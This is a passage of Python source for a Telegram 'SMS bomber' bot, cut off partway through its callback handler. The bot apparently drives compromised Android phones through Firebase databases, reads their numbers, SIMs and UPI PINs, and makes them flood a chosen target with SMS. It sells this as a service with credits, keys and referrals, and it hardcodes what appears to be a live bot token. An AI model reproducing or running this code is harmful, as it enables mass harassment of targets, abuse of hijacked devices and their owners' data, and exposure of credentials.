#!/usr/bin/env python3
"""
Premium Noobster Bomber Bot - Enhanced with Credits, Keys, Multi-User, Speed Control
"""

import os
import io
import json
import logging
import sqlite3
import sys
import functools
import random
import string
import asyncio
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse
from uuid import uuid4

import httpx
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from apscheduler.triggers.date import DateTrigger

# ---------- CONFIG ----------
TOKEN = os.environ.get("BOT_TOKEN", "8454255227:AAG_KvDzNpzu0XE_IrbqmTDVfNx_xhd64CQ")
ADMIN_IDS = [int(x) for x in os.environ.get("ADMIN_IDS", "6840524720").split(",")]
OWNER = "@BRONX_ULTRA"

FORCE_CHANNELS = [
    "@bronx_ultra_osint",
    "@bronx_ultra_osint",
]

MAX_CONCURRENT_REQUESTS = 100
REFERRAL_REWARD = 5

if not TOKEN or TOKEN == "YOUR_BOT_TOKEN_HERE":
    print("❌ ERROR: Bot token is not set.")
    sys.exit(1)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ---------- HEALTH SERVER FOR RENDER ----------
class _HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Bot is running")
    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args, **kwargs):
        pass

def _start_health_server():
    try:
        port = int(os.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), _HealthHandler)
        logger.info(f"Health server listening on port {port}")
        server.serve_forever()
    except Exception as e:
        logger.warning(f"Health server failed: {e}")

def start_health_thread():
    t = threading.Thread(target=_start_health_server, daemon=True)
    t.start()

# ---------- ASYNC HTTP CLIENT ----------
_http_client = None
_http_semaphore = None


def get_http_client() -> httpx.AsyncClient:
    global _http_client
    if _http_client is None or _http_client.is_closed:
        _http_client = httpx.AsyncClient(
            timeout=httpx.Timeout(15.0, connect=8.0),
            limits=httpx.Limits(max_connections=200, max_keepalive_connections=100),
        )
    return _http_client


def get_http_semaphore() -> asyncio.Semaphore:
    global _http_semaphore
    if _http_semaphore is None:
        _http_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    return _http_semaphore


async def check_channel_membership(user_id: int, bot) -> Tuple[bool, List[str]]:
    missing = []
    for channel in FORCE_CHANNELS:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status in ["left", "kicked"]:
                missing.append(channel)
        except Exception:
            missing.append(channel)
    return (len(missing) == 0, missing)


def get_join_keyboard() -> InlineKeyboardMarkup:
    buttons = []
    for ch in FORCE_CHANNELS:
        buttons.append([InlineKeyboardButton(f"🔗 Join {ch}", url=f"https://t.me/{ch.lstrip('@')}")])
    buttons.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_join")])
    return InlineKeyboardMarkup(buttons)


# ---------- DATABASE ----------
DB_PATH = os.environ.get("DB_PATH", "bomber.db")


def _connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=10.0)
    conn.execute("PRAGMA busy_timeout=5000")
    return conn


def init_db():
    conn = _connect()
    c = conn.cursor()
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    c.execute("""
        CREATE TABLE IF NOT EXISTS firebases (
            id TEXT PRIMARY KEY,
            url TEXT NOT NULL,
            secret TEXT NOT NULL,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS jobs (
            id TEXT PRIMARY KEY,
            target TEXT NOT NULL,
            message TEXT NOT NULL,
            devices_used INTEGER,
            success_count INTEGER,
            fail_count INTEGER,
            status TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            scheduled_for TIMESTAMP,
            started_at TIMESTAMP,
            finished_at TIMESTAMP,
            firebase_ids TEXT,
            chat_id INTEGER,
            total_sms INTEGER,
            delay REAL,
            credit_used INTEGER,
            user_id INTEGER
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            credits INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS keys (
            key_string TEXT PRIMARY KEY,
            credits INTEGER NOT NULL,
            max_uses INTEGER NOT NULL,
            used_count INTEGER DEFAULT 0,
            created_by INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS redemptions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_string TEXT,
            user_id INTEGER,
            redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    # Migration: jobs
    c.execute("PRAGMA table_info(jobs)")
    columns = [row[1] for row in c.fetchall()]
    if "total_sms" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN total_sms INTEGER")
    if "delay" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN delay REAL")
    if "credit_used" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN credit_used INTEGER")
    if "user_id" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN user_id INTEGER")

    # Migration: users
    c.execute("PRAGMA table_info(users)")
    ucols = [row[1] for row in c.fetchall()]
    if "is_banned" not in ucols:
        c.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
    if "referred_by" not in ucols:
        c.execute("ALTER TABLE users ADD COLUMN referred_by INTEGER")
    if "referral_paid" not in ucols:
        c.execute("ALTER TABLE users ADD COLUMN referral_paid INTEGER DEFAULT 0")
    if "first_name" not in ucols:
        c.execute("ALTER TABLE users ADD COLUMN first_name TEXT")
    if "username" not in ucols:
        c.execute("ALTER TABLE users ADD COLUMN username TEXT")
    if "first_seen" not in ucols:
        c.execute("ALTER TABLE users ADD COLUMN first_seen TIMESTAMP")

    conn.commit()
    conn.close()

init_db()

# ---------- DB HELPERS ----------
def db_get_firebases() -> Dict[str, Dict]:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT id, url, secret FROM firebases")
    rows = c.fetchall()
    conn.close()
    return {row[0]: {"url": row[1], "secret": row[2]} for row in rows}

def db_add_firebase(fid: str, url: str, secret: str = ""):
    conn = _connect()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO firebases (id, url, secret) VALUES (?,?,?)", (fid, url, secret))
    conn.commit()
    conn.close()

def db_delete_firebase(fid: str):
    conn = _connect()
    c = conn.cursor()
    c.execute("DELETE FROM firebases WHERE id=?", (fid,))
    conn.commit()
    conn.close()

def db_add_job(job_id: str, target: str, message: str, firebase_ids: List[str], chat_id: int, total_sms: int, delay: float, user_id: int) -> str:
    conn = _connect()
    c = conn.cursor()
    c.execute(
        "INSERT INTO jobs (id, target, message, status, firebase_ids, chat_id, total_sms, delay, user_id) VALUES (?,?,?,?,?,?,?,?,?)",
        (job_id, target, message, "pending", ",".join(firebase_ids), chat_id, total_sms, delay, user_id)
    )
    conn.commit()
    conn.close()
    return job_id

def db_update_job(job_id: str, **kwargs):
    conn = _connect()
    c = conn.cursor()
    fields = []
    vals = []
    for k, v in kwargs.items():
        fields.append(f"{k}=?")
        vals.append(v)
    vals.append(job_id)
    c.execute(f"UPDATE jobs SET {','.join(fields)} WHERE id=?", vals)
    conn.commit()
    conn.close()

def db_get_jobs(limit=20, user_id=None) -> List[Dict]:
    conn = _connect()
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    if user_id is not None:
        c.execute("SELECT * FROM jobs WHERE user_id = ? ORDER BY created_at DESC LIMIT ?", (user_id, limit))
    else:
        c.execute("SELECT * FROM jobs ORDER BY created_at DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return [dict(row) for row in rows]

def db_get_setting(key: str, default=None):
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else default

def db_set_setting(key: str, value: str):
    conn = _connect()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?,?)", (key, value))
    conn.commit()
    conn.close()

# ---------- USER/CREDIT ----------
def get_user_credits(user_id: int) -> int:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return row[0]
    conn = _connect()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, credits) VALUES (?,?)", (user_id, 0))
    conn.commit()
    conn.close()
    return 0

def update_user_credits(user_id: int, delta: int):
    conn = _connect()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, 0)", (user_id,))
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (delta, user_id))
    conn.commit()
    conn.close()

def deduct_credits(user_id: int, amount: int) -> bool:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row:
        c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, 0))
        conn.commit()
        c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
        row = c.fetchone()
    if row[0] >= amount:
        c.execute("UPDATE users SET credits = credits - ? WHERE user_id=?", (amount, user_id))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

# ---------- BAN ----------
def user_exists(user_id: int) -> bool:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,))
    r = c.fetchone()
    conn.close()
    return r is not None

def is_user_banned(user_id: int) -> bool:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE user_id=?", (user_id,))
    r = c.fetchone()
    conn.close()
    return bool(r and r[0])

def ban_user_db(user_id: int) -> bool:
    conn = _connect()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, 0)", (user_id,))
    c.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()
    return True

def unban_user_db(user_id: int) -> bool:
    conn = _connect()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned=0 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()
    return True

# ---------- REFERRAL ----------
def register_new_user(user_id: int, first_name: str = "", username: str = ""):
    conn = _connect()
    c = conn.cursor()
    c.execute(
        "INSERT OR IGNORE INTO users (user_id, credits, first_name, username, first_seen) VALUES (?, 0, ?, ?, ?)",
        (user_id, first_name, username, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

def set_referrer(user_id: int, referrer_id: int) -> bool:
    if user_id == referrer_id:
        return False
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT referred_by FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row:
        conn.close()
        return False
    if row[0] is not None:
        conn.close()
        return False
    c.execute("UPDATE users SET referred_by=?, referral_paid=0 WHERE user_id=?", (referrer_id, user_id))
    conn.commit()
    conn.close()
    return True

def get_pending_referrer(user_id: int) -> Optional[int]:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT referred_by, referral_paid FROM users WHERE user_id=?", (user_id,))
    r = c.fetchone()
    conn.close()
    if r and r[0] and not r[1]:
        return r[0]
    return None

def mark_referral_paid(user_id: int):
    conn = _connect()
    c = conn.cursor()
    c.execute("UPDATE users SET referral_paid=1 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def count_referrals(user_id: int) -> int:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users WHERE referred_by=? AND referral_paid=1", (user_id,))
    r = c.fetchone()
    conn.close()
    return r[0] if r else 0

def get_leaderboard(limit=20):
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT user_id, credits, first_name, username FROM users WHERE is_banned=0 ORDER BY credits DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return rows

# ---------- KEY HELPERS ----------
def generate_key_string(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def db_add_key(key_string: str, credits: int, max_uses: int, created_by: int):
    conn = _connect()
    c = conn.cursor()
    c.execute("INSERT INTO keys (key_string, credits, max_uses, created_by) VALUES (?,?,?,?)",
              (key_string, credits, max_uses, created_by))
    conn.commit()
    conn.close()

def db_redeem_key(key_string: str, user_id: int) -> bool:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT credits, max_uses, used_count FROM keys WHERE key_string=?", (key_string,))
    row = c.fetchone()
    if not row:
        conn.close()
        return False
    credits, max_uses, used_count = row
    if used_count >= max_uses:
        conn.close()
        return False
    c.execute("SELECT 1 FROM redemptions WHERE key_string=? AND user_id=?", (key_string, user_id))
    if c.fetchone():
        conn.close()
        return False
    c.execute("UPDATE keys SET used_count = used_count + 1 WHERE key_string=?", (key_string,))
    c.execute("INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, 0)", (user_id,))
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (credits, user_id))
    c.execute("INSERT INTO redemptions (key_string, user_id) VALUES (?,?)", (key_string, user_id))
    conn.commit()
    conn.close()
    return True

# ---------- FIREBASE ----------
async def firebase_request(url: str, method: str = "GET", payload: dict = None, timeout=15):
    raw = url.rstrip("/")
    query = ""
    if "?" in raw:
        raw, query = raw.split("?", 1)
    if raw.endswith(".json"):
        raw = raw[:-5]
    raw = raw.rstrip("/")
    parsed = urlparse(raw)
    if parsed.path:
        full_url = f"{raw}.json"
    else:
        full_url = f"{raw}/.json"
    if query:
        full_url += f"?{query}"
    client = get_http_client()
    try:
        async with get_http_semaphore():
            if method == "GET":
                resp = await client.get(full_url)
            elif method == "PUT":
                resp = await client.put(full_url, json=payload)
            elif method == "POST":
                resp = await client.post(full_url, json=payload)
            elif method == "DELETE":
                resp = await client.delete(full_url)
            else:
                raise ValueError("Unsupported method")
            resp.raise_for_status()
            try:
                return resp.json()
            except json.JSONDecodeError:
                return {"_raw": resp.text}
    except httpx.HTTPStatusError as e:
        status = e.response.status_code
        try:
            err_data = e.response.json() if e.response is not None else {}
        except Exception:
            err_data = {"error": str(e)}
        logger.error(f"Firebase HTTP error {status}: {err_data}")
        return {"_error": True, "status": status, "message": err_data.get("error", str(e))}
    except httpx.ConnectError as e:
        logger.error(f"Firebase connection error: {e}")
        return {"_error": True, "status": 0, "message": "Connection failed. Check the URL."}
    except httpx.TimeoutException:
        logger.error("Firebase request timed out")
        return {"_error": True, "status": 0, "message": "Request timed out."}
    except Exception as e:
        logger.error(f"Firebase error: {e}")
        return {"_error": True, "status": 0, "message": str(e)}

async def get_online_devices(url: str) -> List[Dict]:
    base = url.rstrip("/")
    if base.endswith(".json"):
        base = base[:-5]
    base = base.rstrip("/")
    clients_url = f"{base}/clients.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().get(clients_url)
            resp.raise_for_status()
            clients = resp.json()
    except Exception as e:
        logger.error(f"get_online_devices failed: {e}")
        return []
    if not isinstance(clients, dict):
        return []
    online = []
    for device_id, info in clients.items():
        if info.get("status") is True:
            sims = info.get("sims", [])
            online.append({
                "id": device_id,
                "name": info.get("modelName", device_id),
                "phone": info.get("mobNo", "N/A"),
                "battery": info.get("battery", "N/A"),
                "provider": info.get("service_provider", ""),
                "sims": sims,
                "upipin": info.get("upipin", ""),
                "lastSeen": info.get("lastSeen"),
            })
    return online

async def send_sms_via_device(url: str, device_id: str, sim_index: int, target: str, message: str) -> bool:
    payload = {
        "from": sim_index,
        "to": target,
        "message": message,
        "isSended": False,
        "timestamp": datetime.now().isoformat()
    }
    path = f"clients/{device_id}/webhookEvent/sendSms"
    put_url = f"{url.rstrip('/')}/{path}.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().put(put_url, json=payload)
            resp.raise_for_status()
        return True
    except Exception as e:
        logger.error(f"Send failed for {device_id}: {e}")
        return False

# ---------- GLOBALS ----------
running_jobs = {}
progress_messages = {}
BOT = None

def set_bot(bot):
    global BOT
    BOT = bot

# ---------- UI ----------
LINE = "━━━━━━━━━━━━━━━━━━━━━━━━━"

# ---------- BOMB ENGINE ----------
async def execute_bomb_job(job_id: str, target: str, message: str, firebase_ids: List[str],
                           total_sms: int, delay: float, user_id: int, schedule_time: datetime = None):
    if schedule_time and schedule_time > datetime.now():
        scheduler = AsyncIOScheduler()
        scheduler.add_job(
            execute_bomb_job,
            trigger=DateTrigger(run_date=schedule_time),
            args=[job_id, target, message, firebase_ids, total_sms, delay, user_id, None],
            id=job_id,
            replace_existing=True,
        )
        scheduler.start()
        db_update_job(job_id, status="scheduled", scheduled_for=schedule_time.isoformat())
        return

    db_update_job(job_id, status="running", started_at=datetime.now().isoformat())
    if not deduct_credits(user_id, total_sms):
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0, finished=True, error="Insufficient credits")
        return

    all_devices = []
    firebases = db_get_firebases()
    used_ids = [fid for fid in firebase_ids if fid in firebases]
    for fid in used_ids:
        data = firebases[fid]
        url = data["url"]
        devices = await get_online_devices(url)
        for dev in devices:
            all_devices.append((fid, dev, url))

    if not all_devices:
        update_user_credits(user_id, total_sms)
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0, finished=True, error="No online devices")
        return

    num_devices = len(all_devices)
    sms_per_device = total_sms // num_devices
    remainder = total_sms % num_devices
    assignments = []
    for i, (fid, dev, url) in enumerate(all_devices):
        count = sms_per_device + (1 if i < remainder else 0)
        if count > 0:
            assignments.append((fid, dev, url, count))

    total_attempts = sum(c for _,_,_,c in assignments)
    success = 0
    fail = 0
    await send_progress_update(job_id, 0, total=total_attempts, success=0, fail=0)

    idx = 0
    for fid, dev, url, count in assignments:
        sims = dev.get("sims", [])
        sim_index = 1 if sims else 1
        for _ in range(count):
            ok = await send_sms_via_device(url, dev["id"], sim_index, target, message)
            if ok:
                success += 1
            else:
                fail += 1
            idx += 1
            await send_progress_update(job_id, idx, total=total_attempts, success=success, fail=fail)
            await asyncio.sleep(delay)

    if fail > 0:
        update_user_credits(user_id, fail)

    db_update_job(
        job_id,
        status="completed",
        finished_at=datetime.now().isoformat(),
        devices_used=num_devices,
        success_count=success,
        fail_count=fail,
        credit_used=success,
    )
    await send_progress_update(job_id, total_attempts, total=total_attempts, success=success, fail=fail, finished=True)
    running_jobs.pop(job_id, None)
    progress_messages.pop(job_id, None)


async def send_progress_update(job_id: str, done: int, total: int, success: int, fail: int,
                               finished: bool = False, error: str = None):
    if BOT is None:
        return
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT chat_id, target, user_id FROM jobs WHERE id=?", (job_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        return
    chat_id, target, user_id = row
    credits = get_user_credits(user_id) if user_id else 0
    if total == 0:
        percent = 0
    else:
        percent = int((done / total) * 100)
    bar_length = 20
    filled = int(bar_length * percent / 100)
    bar = "▰" * filled + "▱" * (bar_length - filled)
    if error:
        status_text = f"❌ <b>Error:</b> {error}"
    elif finished:
        status_text = "✅ <b>Completed</b>"
    else:
        status_text = "🔄 <b>Running</b>"

    text = (
        f"{LINE}\n"
        f"💣 <b>Xipher Bomb</b> | Job: <code>{job_id}</code>\n"
        f"{LINE}\n\n"
        f"{bar}  <b>{percent}%</b>\n\n"
        f"📞 Target: <code>{target}</code>\n"
        f"✅ Sent: {success}   ❌ Failed: {fail}\n"
        f"💳 Credits: {credits}\n\n"
        f"📌 Status: {status_text}"
    )

    if job_id in progress_messages:
        msg_id = progress_messages[job_id]
        try:
            await BOT.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode=ParseMode.HTML)
        except Exception as e:
            logger.warning(f"Could not edit progress: {e}")
    else:
        try:
            msg = await BOT.send_message(chat_id, text, parse_mode=ParseMode.HTML)
            progress_messages[job_id] = msg.message_id
        except Exception as e:
            logger.warning(f"Could not send progress: {e}")

# ---------- CONVERSATION ----------
(TARGET, MESSAGE, SMS_COUNT, SPEED, SCHEDULE) = range(5)

USER_BUTTONS = ["💣 Launch Bomb", "💰 Balance", "📊 Status", "📜 History", "🔑 Redeem Key", "🎁 Refer & Earn"]
ADMIN_BUTTONS = ["📡 Online Devices", "📊 Stats & History", "⚙️ Manage Firebases", "🔑 Generate Key", "👑 Admin Panel"]
ALL_BUTTONS = USER_BUTTONS + ADMIN_BUTTONS


async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🏓 Pong! ⚡ <b>Bot is fast & online.</b>", parse_mode=ParseMode.HTML)


def get_main_keyboard(user_id: int):
    if user_id in ADMIN_IDS:
        keyboard = [
            ["💣 Launch Bomb", "💰 Balance"],
            ["📊 Status", "📜 History"],
            ["🔑 Redeem Key", "🎁 Refer & Earn"],
            ["📡 Online Devices", "📊 Stats & History"],
            ["⚙️ Manage Firebases", "🔑 Generate Key"],
            ["👑 Admin Panel"],
        ]
    else:
        keyboard = [
            ["💣 Launch Bomb", "💰 Balance"],
            ["📊 Status", "📜 History"],
            ["🔑 Redeem Key", "🎁 Refer & Earn"],
        ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


async def notify_admins_new_user(context, user):
    uname = f"@{user.username}" if user.username else "N/A"
    text = (
        "🆕 <b>NEW USER STARTED BOT</b>\n"
        f"{LINE}\n"
        f"👤 Name: {user.first_name or 'N/A'}\n"
        f"🏷️ Username: {uname}\n"
        f"🆔 ID: <code>{user.id}</code>\n"
        f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(admin_id, text, parse_mode=ParseMode.HTML)
        except Exception as e:
            logger.warning(f"Could not notify admin {admin_id}: {e}")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    args = context.args or []

    ref_id = None
    if args and args[0].startswith("ref_"):
        try:
            ref_id = int(args[0].split("_", 1)[1])
        except Exception:
            ref_id = None

    if user_exists(user_id) and is_user_banned(user_id):
        await update.message.reply_text("🚫 <b>You are banned from using this bot.</b>", parse_mode=ParseMode.HTML)
        return

    is_new = not user_exists(user_id)
    if is_new:
        register_new_user(user_id, user.first_name or "", user.username or "")
        try:
            await notify_admins_new_user(context, user)
        except Exception as e:
            logger.warning(f"notify_admins_new_user failed: {e}")
    else:
        conn = _connect()
        c = conn.cursor()
        c.execute("UPDATE users SET first_name=?, username=? WHERE user_id=?",
                  (user.first_name or "", user.username or "", user_id))
        conn.commit()
        conn.close()

    if ref_id and ref_id != user_id:
        set_referrer(user_id, ref_id)

    get_user_credits(user_id)

    joined, missing = await check_channel_membership(user_id, context.bot)
    if not joined:
        text = (
            "╔══════════════════════════════════╗\n"
            "     🔥 <b>PREMIUM XIPHER BOMBER</b> 🔥\n"
            "╚══════════════════════════════════╝\n\n"
            "⚠️ <b>Please join all channels to use this bot:</b>\n\n"
            f"👑 <b>Owner:</b> {OWNER}\n\n"
            "Join the channels below and click ✅ I've Joined:"
        )
        await update.message.reply_text(
            text, reply_markup=get_join_keyboard(), parse_mode=ParseMode.HTML
        )
        return

    await try_pay_referral(context, user_id)

    credits = get_user_credits(user_id)
    is_admin = user_id in ADMIN_IDS
    role = "👑 <b>ADMIN</b>" if is_admin else "⚡ <b>USER</b>"
    refs = count_referrals(user_id)

    text = (
        "╔══════════════════════════════════╗\n"
        "     🔥 <b>PREMIUM XIPHER BOMBER</b> 🔥\n"
        "╚══════════════════════════════════╝\n\n"
        f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
        f"💎 <b>Credits:</b> {credits}\n"
        f"🎁 <b>Referrals:</b> {refs}\n"
        f"🎖️ <b>Role:</b> {role}\n"
        f"👑 <b>Owner:</b> {OWNER}\n\n"
        f"{LINE}\n"
        "🚀 <b>Server:</b> Ultra-Fast Async\n"
        "⚡ <b>Multi-User:</b> Unlimited\n"
        "🛡️ <b>Status:</b> ✅ Online\n"
        f"{LINE}\n\n"
        "👇 Use the buttons below to navigate ✨"
    )

    await update.message.reply_text(
        text, reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML
    )


async def try_pay_referral(context, user_id):
    pending = get_pending_referrer(user_id)
    if pending is None:
        return
    update_user_credits(pending, REFERRAL_REWARD)
    mark_referral_paid(user_id)
    try:
        await context.bot.send_message(
            chat_id=pending,
            text=(
                "🎉 <b>REFERRAL BONUS!</b>\n"
                f"{LINE}\n"
                f"Someone joined using your referral link.\n"
                f"💎 +{REFERRAL_REWARD} credits added to your account!\n"
                f"🎁 Total referrals: {count_referrals(pending)}"
            ),
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        logger.warning(f"Could not notify referrer {pending}: {e}")


# ---------- CALLBACK ----------
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    if is_user_banned(user_id):
        await query.edit_message_text("🚫 You are banned.")
        return

    if data == "balance":
        credits = get_user_credits(user_id)
        text = (
            "💎 <b>PREMIUM VAULT</b>\n"
            f"{LINE}\n"
            f"💳 Balance: <b>{credits}</b> credits\n"
            f"{LINE}"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.HTML)
        return
    elif data == "history":
        jobs = db_get_jobs(limit=10, user_id=user_id)
        if not jobs:
            await query.edit_message_text("📜 No jobs found yet.")
            return
        text = "📜 <b>PREMIUM HISTORY</b>\n" + f"{LINE}\n\n"
        for j in jobs:
            status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌", "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
            text += f"{status_emoji} <code>{j['id']}</code> → {j['target']} <b>({j['status']})</b>\n"
        await query.edit_message_text(text, parse_mode=ParseMode.HTML)
        return
    elif data == "status":
        jobs = db_get_jobs(limit=10, user_id=user_id)
        if not jobs:
            await query.edit_message_text("📊 You have no bombing jobs yet.")
            return
        text = "📊 <b>PREMIUM STATUS REPORT</b>\n" + f"{LINE}\n\n"
        for j in jobs:
            status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌", "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
            success = j.get("success_count", 0) or 0
            fail = j.get("fail_count", 0) or 0
            total = j.get("total_sms", 0) or 0
            credit_used = j.get("credit_used", 0) or 0
            text += (
                f"{status_emoji} <b>Job:</b> <code>{j['id']}</code>\n"
                f"   🎯 Target: <code>{j['target']}</code>\n"
                f"   📨 Total: {total} | ✅ {success} | ❌ {fail}\n"
                f"   💳 Cost: {credit_used} | 🕒 {j['created_at'][:16]}\n"
                f"   📌 <b>{j['status']}</b>\n"
                f"   {'─' * 29}\n"
            )
        await query.edit_message_text(text, parse_mode=ParseMode.HTML)
        return
    elif data == "check_join":
        joined, missing = await check_channel_membership(user_id, BOT)
        if joined:
            await try_pay_referral(context, user_id)
            await query.edit_message_text(
                "✅ <b>All channels joined!</b>\nWelcome to Premium Xipher Bomber.",
                parse_mode=ParseMode.HTML
            )
            credits = get_user_credits(user_id)
            is_admin = user_id in ADMIN_IDS
            role = "👑 <b>ADMIN</b>" if is_admin else "⚡ <b>USER</b>"
            refs = count_referrals(user_id)
            text = (
                "╔══════════════════════════════════╗\n"
                "     🔥 <b>PREMIUM XIPHER BOMBER</b> 🔥\n"
                "╚══════════════════════════════════╝\n\n"
                f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
                f"💎 <b>Credits:</b> {credits}\n"
                f"🎁 <b>Referrals:</b> {refs}\n"
                f"🎖️ <b>Role:</b> {role}\n"
                f"👑 <b>Owner:</b> {OWNER}\n\n"
                f"{LINE}\n"
                "🚀 <b>Server:</b> Ultra-Fast Async\n"
                "⚡ <b>Multi-User:</b> Unlimited\n"
                "🛡️ <b>Status:</b> ✅ Online\n"
                f"{LINE}\n\n"
                "👇 Use the buttons below to navigate ✨"
            )
            await query.message.reply_text(
                text, reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML
            )
        else:
            ch_list = "\n".join([f"• {ch}" for ch in missing])
            await query.edit_message_text(
                f"❌ <b>You haven't joined all channels yet!</b>\n\nMissing:\n{ch_list}\n\n"
                "Please join and click ✅ I've Joined again.",
                reply_markup=get_join_keyboard(),
                parse_mode=ParseMode.HTML
            )
        return
    elif data == "redeem_key":
        context.user_data["awaiting_redeem"] = True
        await query.edit_message_text(
            "🔑 <b>REDEEM KEY</b>\n"
            f"{LINE}\n"
            "Please send the key you want to redeem.\n"
            "Example: <code>ABCD1234</code> 🎟️",
            parse_mode=ParseMode.HTML
        )
        return
    elif data == "gen_key":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("⛔ Unauthorized.")
            return
        await query.edit_message_text(
            "🔑 <b>GENERATE KEY (ADMIN)</b>\n"
            f"{LINE}\n"
            "To generate a key, use:\n<code>/addkey &lt;credits&gt; &lt;max_uses&gt;</code>\n"
